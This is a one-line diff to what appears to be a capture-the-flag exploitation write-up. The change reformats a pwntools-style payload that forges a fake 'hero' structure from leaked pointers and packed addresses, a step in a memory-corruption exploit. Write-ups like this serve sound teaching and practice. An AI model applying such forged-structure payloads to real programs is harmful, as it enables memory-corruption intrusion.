@@ -362,7 +362,7 @@ It is possible to use the index "0" and then this will take the 10th address fro
 
   
 
-fake_hero=(4*p64(0x0))+p64(dragon_data)+p64(hero_pointer)+p64(0xb)+p64(0x19)+p64(0xfff)+p64(leak+0x38)+p64(0xd)+p64(0xdeadbeef)+p64(0xdeadbeef)
+> fake_hero=(4*p64(0x0))+p64(dragon_data)+p64(hero_pointer)+p64(0xb)+p64(0x19)+p64(0xfff)+p64(leak+0x38)+p64(0xd)+p64(0xdeadbeef)+p64(0xdeadbeef)
 
   
 
